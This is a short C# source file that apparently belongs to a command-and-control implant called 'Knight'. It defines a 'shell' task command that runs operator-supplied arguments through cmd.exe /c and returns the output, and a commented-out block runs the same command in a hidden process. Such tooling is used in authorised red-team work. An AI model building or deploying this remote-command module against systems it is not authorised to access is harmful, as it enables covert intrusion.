using Internal = SharedArsenal.Internal;
using Knight.Models.Raven;

namespace Knight.Commands
{
    public class Shell : KnightCommand
    {
        public override string Name => "shell";

        // cmd.exe /c <command>
        public override string Execute(TaskMessage task)
        {
            var args = string.Join(" ", task.Arguments);

            //var startInfo = new ProcessStartInfo
            //{
            //    FileName = @"C:\Windows\System32\cmd.exe",
            //    Arguments = $"/c {args}",
            //    WorkingDirectory = Directory.GetCurrentDirectory(),
            //    RedirectStandardOutput = true,
            //    RedirectStandardError = true,
            //    UseShellExecute = false,
            //    CreateNoWindow = true,
            //};

            //var process = Process.Start(startInfo);
            //string output = "";

            //using (process.StandardOutput)
            //{
            //    output += process.StandardOutput.ReadToEnd();
            //}

            //using (process.StandardError)
            //{
            //    output += process.StandardError.ReadToEnd();
            //}

            //return output;

            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {args}");
        }
    }
}